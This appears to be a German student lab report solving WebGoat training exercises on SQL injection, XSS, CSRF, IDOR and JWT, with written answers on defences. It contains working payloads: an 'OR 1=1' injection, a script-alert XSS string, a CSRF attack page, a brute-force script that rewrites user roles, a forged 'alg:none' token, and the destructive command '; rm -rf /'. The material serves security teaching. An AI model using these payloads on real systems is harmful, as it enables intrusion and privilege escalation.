# 183 - KN02 - SQL Injection, XSS, CSRF, IDOR, JWT

- [A WebGoat starten](#a-webgoat-starten)
- [B SQL Injection](#b-sql-injection)
- [C Cross-Site Scripting (XSS)](#c-cross-site-scripting-xss)
- [D Cross-Site Request Forgery (CSRF)](#d-cross-site-request-forgery-csrf)
- [E Broken Access Control - (IDOR)](#e-broken-access-control---idor)
- [F Broken Authentication (JWT)](#f-broken-authentication-jwt)


## A WebGoat starten

![WebGoat Landing Page](../../img/M183_KN02_2.png)
_WebGoat Startseite mit erkennbarer EC2-IP_
![AWS Security Group](../../img/M183_KN02_1.png)
_Screenshot der Inbound-Rules_

## B SQL Injection

1. Zeichnen Sie auf, wie das SQL-Statement aus B1 vor und nach dem Einschleusen des Payloads aussieht. Erklären Sie, warum die Authentifizierung dadurch umgangen wird.

   ![Login Bypass](../../img/M183_KN02_3.gif)

   **Vor dem Einschleusen (Soll-Zustand)**

   _Die Applikation erwartet eine Zahl im Feld `User_Id` (bzw. `Login_Count`), um einen spezifischen Benutzer zu filtern._

   ```sql
   SELECT * FROM user_data WHERE Login_Count = 1 AND userid = [EINGABE];
   ```

   _Wenn ein Benutzer die ID `105` eingibt, sucht die Datenbank exakt nach dieser ID. Gibt es sie nicht bleibt das Ergebnis leer und der Zugriff wird verweigert._

   **Nach dem Einschleusen (Ist-Zustand)**

   _Durch die Eingabe von `1 OR 1=1 -- ` (oder einer funktionierenden Variante wie `1 OR TRUE -- `) wird das Statement strukturell verändert:_

   ```sql
   SELECT * FROM user_data WHERE Login_Count = 1 AND userid = 1 OR 1=1 --;
   ```

   **Warum die Authentifizierung umgangen wird?**

   _Der Datenbank-Parser wertet die `WHERE`-Bedingung logisch aus. Durch das `OR 1=1 -- ` wird eine Bedingung hinzugefügt, die **immer wahr (TRUE)** ist._
   - Da das `--` den restlichen Teil der originalen Abfrage auskommentiert (abschneidet), lautet die logische Prüfung für die Datenbank im Kern nur noch: _„Gib die Zeile aus, wenn die ID 1 ist ODER wenn 1 gleich 1 ist“._

   - Weil `1=1` für jede einzelne Zeile in der Tabelle zutrifft, ignoriert die Datenbank die Identitätsprüfung und gibt `alle Datensätze` an die Applikation zurück. Die Applikation sieht ein erfolgreiches Datenbank-Ergebnis und gewährt fälschlicherweise Zugriff.

---

2. Wie funktionieren Prepared Statements (parameterisierte Abfragen) technisch? Warum kann SQL Injection damit nicht mehr funktionieren?

   Bei einem **Prepared Statement** (parametrierte Abfrage) trennt die Webapplikation den ausführbahen SQL-Code strikt von den variablen Benutzerdaten. Das geschieht in zwei Schritten:
   1. **Kompilierung (Prepare):** Die Applikation sendet das SQL-Grundgerüst mit Platzhaltern (`?`) an die Datenbank:

      ```sql
      SELECT * FROM user_data WHERE Login_Count = ? AND userid = ?;
      ```

      Die Datenbank analysisert diese Struktur, baut den Ausführungsplan auf und legt fest, was Code und was Daten sind. Die Struktur steht ab diesem Moment felsenfest.

   2. **Einfügen der Parameter (Execute):** Erst danach werden die Benutzereingaben (z.B. `1 OR 1=1`) als reine Parameter an die Platzhalter übergeben.

   **Warum SQL Injection damit unmöglich wird**

   Da die Datenbank den SQL-Befehl bereits in Schritt 1 fertig kompiliert hat, kann die Benutzereingabe die logische Struktur des Befehls nicht mehr verändern.

   Gibt ein Angreifer `1 OR 1=1` ein, sucht die Datenbank buchstäblich nach einem Benutzer, dessen ID exakt der String `1 OR "1 OR 1=1"` ist. Der Payload wird wie harmloser Freitext behandelt und verliert jegliche subversive Wirkung.

---

3. Welche OWASP Top 10 Kategorie (2025) beschreibt SQL Injection? Nennen Sie Nummer und Bezeichnung.

   [**A05:2025-Injection**](https://owasp.org/Top10/2025/A05_2025-Injection/)

---

4. Nennen Sie neben SQL Injection zwei weitere Injection-Varianten (z.B. OS Command Injection, LDAP Injection) und beschreiben Sie kurz, was dabei injiziert wird und wo die Gefahr liegt.
   1. **OS Command Injection** (Betriebssystem-Befehlsinjektion)
      - **Was wird injiziert?** Systembefehle des zugrundeliegenden Betriebssystems (z. B. `; rm -rf /` oder `& dir`), verpackt in Eingabefelder, die Parameter an Systemprozesse übergeben.

      - **Wo liegt die Gefahr?** Wenn eine Webapplikation z. B. ein Ping-Tool bereitstellt und die IP-Eingabe ungefiltert an die System-Shell übergibt, kann ein Angreifer über Trennzeichen eigene Befehle anhängen. Die Gefahr reicht von der Offenlegung sensibler Systemdateien bis zur vollständigen Übernahme des Webservers (Remote Code Execution).

   2. **LDAP Injection** (Lightweight Directory Access Protocol)
      - **Was wird injiziert?** Steuerzeichen für Verzeichnisdienste (z. B. `*`, `(`, `)`, `&`, `|`), die in Abfragen an ein Active Directory oder ein LDAP-Verzeichnis eingebettet werden.

      - **Wo liegt die Gefahr?** Viele Unternehmen nutzen LDAP für das Single-Sign-On (Mitarbeiter-Login). Wird die Eingabe nicht bereinigt, kann ein Angreifer die LDAP-Suchfilter manipulieren (analog zu SQLi). Die Gefahr liegt im Umgehen der Login-Maske oder dem unbefugten Auslesen von Mitarbeiter- und Strukturdaten aus dem Firmennetzwerk.

---

## C Cross-Site Scripting (XSS)

Original Payload
QTY1=1&QTY2=1&QTY3=1&QTY4=1&field1=1234&field2=111

Angepasster Payload
QTY1=1&QTY2=1&QTY3=1&QTY4=1&field1=%3Cscript%3Ealert(%27Reflected%20XSS%27)%3C%2Fscript%3E&field2=111

Abgabe C:

- Screenshot des ausgelösten Alerts bei C1a (Reflected) mit dem Payload sichtbar im Eingabefeld oder Response.

  ![C1a Screenshot](../../img/M183_KN02_6.png)

- Screenshot der C1b-Analyse: welche Codezeile(n) Sie als verwundbar markiert haben.

  ![](../../img/M183_KN02_8.gif)
  ![C1b Analyse](../../img/M183_KN02_7_arrow.png)

- Screenshot des ausgelösten Alerts bei C2 (Stored) nach dem Speichern des Kommentars.
  ![](../../img/M183_KN02_9.gif)
  ![](../../img/M183_KN02_10small.gif)

- Screenshot der gelösten WebGoat-Aufgabe C2 (grüne Bestätigung).

  ![](../../img/M183_KN02_10.gif)
  ![](../../img/M183_KN02_11.png)

- Schriftliche Antworten auf die fünf Fragen:
  1. Was ist der zentrale Unterschied zwischen Reflected XSS und Stored XSS hinsichtlich Persistenz und Reichweite?

     **Persistenz:**
     - _**Reflected XSS** ist flüchtig. Der Payload befindet sich im Link/Request und wird vom Server sofort einmalig zurückgespiegelt._

     - _**Stored XSS** ist dauerhaft (persistent). Der Payload wird direkt in der Datenbank des Servers gespeichert._

     **Reichweite:**
     - _**Reflected XSS** trifft **nur gezielte Opfer**, die aktiv auf einen manipulierten Link klicken._

     - _**Stored XSS** trifft **alle Benutzer**, die die betroffene Seite aufrufen._

  2. Was unterscheidet DOM-based XSS von Reflected XSS – warum ist DOM-based XSS für serverseitige Filter schwieriger zu erkennen?

     **Unterschied:**

     _Reflected XSS wird vom Server in das HTML eingebaut. DOM-based XSS geschieht im Client-Browser, weil ein dortiges JavaScript-Skript Daten unsicher verarbeitet._

     **Warum schwerer zu erkennen:**

     _Bei DOM-based XSS wird der Payload (z.B. nach einem `#` in der URL) oft gar nicht an den Server übermittelt. Da der Server die Schadsoftware im HTTP-Request nie zu Gesicht bekommt, laufen serverseitige Filter komplett ins Leere._

  3. Was bedeutet Output Encoding und warum schützt es gegen XSS? Geben Sie ein konkretes Beispiel, wie `<script>` nach dem Encoding aussieht.

     **Bedeutung & Schutz:**

     _Es wandelt potenziell gefährliche Steuerzeichen (wie `<` oder `>`) in sichere HTML-Entitäten um. Der Browser interpretiert die Eingabe dadurch nicht mehr als ausführbaren Code, sondern als reinen Text._

     **Beispiel:**

     ```plaintext
     &lt;script&gt;
     ```

  4. Was ist der HTTP-Header `Content-Security-Policy` (CSP) und wie schränkt er XSS ein? (Recherchieren Sie falls nötig.)

     **Definition:**

     _Ein HTTP-Response-Header, mit dem der Server dem Browser eine Whitelist vertrauenswürdiger Datenquellen und Skripte vorgibt._

     **XSS-Einschränkungen:**

     _Selbst weinn ein Angreifer erfolgreich HTML-Code injiziert, blockiert die CSP die Ausführung, indem sie beispielsweise das Ausführen von Inline-Skripten (`<script>...</script>`) oder das Nachladen von Code von fremden Domänen strikt verbietet._

  5. Welche OWASP Top 10 Kategorie (2021) beschreibt XSS? Nennen Sie Nummer und Bezeichnung.

     _**[A03:2021-Injection](https://owasp.org/Top10/2021/A03_2021-Injection/)**_

## D Cross-Site Request Forgery (CSRF)

- Den Inhalt der csrf-attack.html-Datei (Screenshot oder Code-Block).
  ```html
  <!DOCTYPE html>
  <html>
    <head>
      <title>Gewinnspiel</title>
    </head>
    <body>
      <h1>Glückwunsch! Sie haben gewonnen!</h1>
      <p>Klicken Sie auf den Button, um Ihren Preis einzulösen:</p>

      <form
        id="csrfForm"
        action="http://32.192.216.86:8080/WebGoat/csrf/basic-get-flag"
        method="POST"
      >
        <input
          type="submit"
          value="HIER PREIS ABHOLEN"
          style="padding: 10px 20px; font-size: 16px; background-color: green; color: white; border: none; cursor: pointer;"
        />
      </form>
    </body>
  </html>
  ```
- Screenshot der analysierten Netzwerk-Anfrage aus DevTools (URL, Methode und Parameter sichtbar).

  ![POST Anfrage](../../img/M183_KN02_13.png)

- Screenshot, der zeigt, dass der Angriff erfolgreich war (grüne WebGoat-Bestätigung).

  ![CSRF Bestätigung](../../img/M183_KN02_12.png)

- Schriftliche Antworten auf die vier Fragen:
  1. Warum schickt der Browser den Session-Cookie mit, wenn die Anfrage von `csrf-attack.html` (einer lokalen Datei) kommt – obwohl das Opfer diese Seite nie bewusst besucht hat?

     _Der Browser unterscheidet standardmäßig nicht, wer oder welche Website eine Anfrage auslöst, sondern nur, an wen sie gerichtet ist. Da die Ziel-URL in der `csrf-attack.html` auf die IP-Adresse der WebGoat-Instanz verweist, greift der automatische Cookie-Mechanismus des Browsers: Er packt alle für diese Domäne/IP gültigen Session-Cookies ungefragt in den HTTP-Header, solange der Benutzer dort im selben Browser noch parallel eingeloggt ist._

  2. Was ist ein CSRF-Token und warum kann eine Angreifer-Seite ihn nicht einfach aus dem Formular lesen?

     **Was es ist:**

     _Ein CSRF-Token ist ein kryptografisch sicherer, zufälliger und einmaliger Wert, den der Server generiert und fest an die aktuelle Session des Nutzers bindet. Dieses Token muss bei jeder sensitiven Anfrage (z. B. POST) zwingend mitgeschickt werden._

     **Wie es funktioniert:**

     _Aufgrund der **Same-Origin-Policy (SOP)** des Browsers ist es einer fremden Website (oder einer lokalen HTML-Datei) strengstens untersagt, die Inhalte oder das DOM einer anderen Domäne (WebGoat) auszulesen. Der Angreifer kann das Formular zwar blind abschicken, das geheime Token darin aber weder sehen noch im Vorfeld stehlen._

  3. Was bewirkt das `SameSite=Strict`-Flag bei einem Cookie und wie schützt es vor CSRF?

     **Wirkung:**

     _Das Flag `SameSite=Strict` weist den Browser an, das Cookie **ausschliesslich dann** mitzusenden wwernn die Anfrage von derselben Domäne (Origin) stammt, die auch in der Adressleiste des Browsers steht._

     **CSRF-Schutz:**

     _Sobald ein Link oder ein Formular von einer externen Seite (oder einer lokalen Datei wie `csrf-attack.html`) aufgerufen wird, blockiert der Browser das Mitsenden des Session-Cookies komplett. Da der Server die Anfrage ohne das Cookie als "nicht eingeloggt" einstuft, läuft der CSRF-Angriff ins Leere._

  4. Welche OWASP Top 10 Kategorie (2025) beschreibt CSRF am ehesten? Nennen Sie Nummer und Bezeichnung.

     _**[A01:2025 - Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)**_

## E Broken Access Control - (IDOR)

- Screenshot des gelesenen fremden Profils mit sichtbarer Profil-ID in der URL oder im Response.
  ![](../../img/M183_KN02_14.png)
  ![](../../img/M183_KN02_15.gif)
- Screenshot oder Command der erfolgreichen Veränderung (WebGoat-Bestätigung sichtbar).
  ![](../../img/M183_KN02_16.png)
  ![](../../img/M183_KN02_17.png)

  ```js
    for (let i = 200000; i <= 234240; i++) {
        if (i === 234238) continue; 

        fetch(`http://32.192.216.86:8080/WebGoat/IDOR/profile/${i}`, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                "role": 1,
                "color": "red",
                "size": "small",
                "name": "Buffalo Bill",
                "userId": i.toString()
            })
        })
        .then(res => res.json())
        .then(json => {
            if (json.lessonCompleted === true || json.feedback?.includes("Congratulations")) {
                console.log(`%cERFOLG! Buffalo Bill hatte die ID: ${i}`, "color: green; font-size: 16px; font-weight: bold;");
                console.log(json);
            } else {
                console.log(`ID ${i} versucht...`);
            }
        })
        .catch(err => console.error(`Fehler bei ID ${i}:`, err));
    }
  ```

- Schriftliche Antworten auf die vier Fragen:
  1.  Warum reicht es nicht, eine Ressource einfach «nicht zu verlinken», um sie zu schützen? (Stichwort: Security through Obscurity)

      _Das blosse Weglassen eines Links verbirgt die Ressource nur visuell auf der Benutzeroberfläche, schützt aberr nicht den tatsächlichen Netzwerkendpunkt. Da RESTful APIs logischen Muistern folgen (z.B `/profile/{id}`), können Angeifer verborgene URLs durch logisches Raten, Vorhersagen von Mustern oder einfaches Ausprobieren (Brute Force) direkt ansteuern._ Echte Sicherheit erfordert immer eine aktive Zugriffskontrolle am Endpunkt selbst.

  2.  Wie hätte die Applikation den IDOR-Angriff verhindern können? Beschreiben Sie die notwendige serverseitige Prüfung.

        **Identitätsprüfung:**

        _Der Server nimmt die Benutzer-ID (Session-ID/JWT) aus dem sicheren Sitzungskontext (nicht aus der URL oder dem Request-Body)._

        **Rechteprüfung:**

        _Der Server prüft in der Datenbank, ob die soeben identifizierte Sitzung das Recht besitzt, auf die angeforderte Objekt-ID (z. B. das Profil `234227`) zuzugreifen oder diese zu modifizieren. Stimmen Benutzer-ID und Ziel-Objekt-ID nicht überein (und der User ist kein Administrator), muss der Server die Anfrage mit `403 Forbidden` blockieren._

  3.  Was ist der Unterschied zwischen horizontaler und vertikaler Privilegienerweiterung? Welche Form zeigt dieses IDOR-Beispiel?

        **Horizontale Privilegienerweiterung:**

        _Ein Angreifer greift auf Daten oder Ressourcen eines anderen Benutzers zu, der sich auf derselben Berechtigungsstufe befindet (z. B. das Profil eines anderen regulären Nutzers einsehen)._
    
        **Vertikale Privilegienerweiterung:**

        _Ein Angreifer erlangt Funktionen oder Rechte einer höheren Berechtigungsstufe (z. B. ein regulärer Nutzer macht sich selbst zum Administrator)._
    
        **Dieses IDOR-Beispiel zeigt:**

        _**Beide Formen kombiniert.** Der Zugriff auf Buffalo Bills Profil war zuerst horizontal (ein fremdes User-Profil abgreifen). Durch die Modifikation des Feldes `"role": 1` fand jedoch direkt eine vertikale Privilegienerweiterung statt, da administrative Rollen meist niedrigere Nummern besitzen._

  4.  Welche OWASP Top 10 Kategorie (2025) beschreibt Broken Access Control? Nennen Sie Nummer und Bezeichnung und erklären Sie, warum sie auf Platz 1 steht.

        _A01:2025 - Broken Access Control_

        _Sie führt die Liste an, weil Fehler in der Zugriffskontrolle statistisch die **häufigste und kritischste Schwachstelle** in modernen Webanwendungen sind (bei über 94 % der von OWASP getesteten Anwendungen wurden entsprechende Schwachstellen gefunden). Da immer mehr Anwendungen auf dezentrale APIs und Microservices setzen, steigt die Komplexität, die Zugriffsrechte an jedem einzelnen Endpunkt konsistent und fehlerfrei zu validieren._

## F Broken Authentication (JWT)

- Screenshot von jwt.io mit dem analysierten Original-Token (Payload sichtbar, Algorithmus sichtbar).

    ![JWT Analyse](../../img/M183_KN02_18.png)
    ![JWT Analyse](../../img/M183_KN02_19.gif)

- Den vollständigen manipulierten Token (als Text oder Screenshot).
    ```jwt
    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpYXQiOjE3ODM3ODE3MTcsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
    ```

    ```json
    {
        "header": {
            "alg": "none",
            "typ": "JWT"
        },
        "payload": {
            "iat": 1783781717,
            "admin": "true",
            "user": "Tom"
        }
    }
    ```


- Screenshot der grünen Bestätigung in WebGoat nach dem erfolgreichen Angriff.

    ![JWT Bestätigung](../../img/M183_KN02_20.gif)

- Schriftliche Antworten auf die vier Fragen:
  
  1. Warum ist es ein Sicherheitsproblem, wenn ein Server `"alg":"none"` akzeptiert?

        _Wenn ein Server den Algorithmus `"none"` akzeptiert, verzichtet er bei der Validierung des Tokens aktiv auf die Überprüfung der kryptografischen Signatur. Die Signatur dient als digitaler Siegelring: Fehlt die Prüfung, verliert das Token seine **Integritätssicherung**. Ein Angreifer kann beliebige Werte im Payload (wie Benutzerrollen oder IDs) manipulieren und den Signaturteil einfach weglassen. Der Server vertraut den manipulierten Daten dann blind._
  
  2. JWT-Payloads sind nur Base64url-kodiert, nicht verschlüsselt. Was bedeutet das für den Umgang mit sensiblen Daten im Token?
  
        _Base64url ist ein reines Kodierungsverfahren (vergleichbar mit einer anderen Schriftart), das Daten lediglich in ein transportsicheres Textformat bringt – es bietet keinerlei Vertraulichkeit oder Verschlüsselung. Da jeder Client, Proxy oder Angreifer den Payload mit Standard-Tools (oder Webseiten wie `jwt.io`) sofort im Klartext auslesen kann, gilt die strikte Regel: **Es dürfen niemals sensible Daten** (wie Passwörter, Sozialversicherungsnummern, persönliche Daten oder interne Systemgeheimnisse) unverschlüsselt in einem JWT hinterlegt werden._
  
  3. Welche Massnahmen schützen gegen JWT-Angriffe? Nennen Sie mindestens drei (z.B. Algorithmus-Whitelist, kurze Ablaufzeiten, serverseitige Signaturprüfung).
  
        - **Algorithmus-Whitelist:** _Der Server muss im Code fest definieren, welche Signaturalgorithmen erlaubt sind (z. B. ausschließlich `HS256` oder `RS256`). Unerwartete Algorithmen oder der Wert `none` müssen sofort blockiert werden._

        - **Erzwungene Signaturprüfung:** _Die Validierung der Signatur muss zwingend als allererster Schritt im Backend erfolgen, noch bevor Daten aus dem Payload ausgelesen oder verarbeitet werden._

        - **Kurze Ablaufzeiten (`exp`-Claim):** _Token sollten eine minimale Lebensdauer (z. B. 15 Minuten) besitzen. Dadurch wird das Zeitfenster für den Missbrauch drastisch verkürzt, falls ein Token abgefangen oder per Brute-Force angegriffen wird._

        - **Starke Geheimnisse (Kryptografische Entropie):** _Bei symmetrischen Verfahren (HMAC) muss der Schlüssel lang und zufällig genug sein, um Offline-Wörterbuchangriffe (z. B. mit Hashcat) unmöglich zu machen._
    
  4. Welche OWASP Top 10 Kategorie (2021) beschreibt Broken Authentication? Nennen Sie Nummer und Bezeichnung.

        _**[A07:2021- Identification and Authentication Failures](https://owasp.org/Top10/2021/A07_2021-Identification_and_Authentication_Failures/)**_
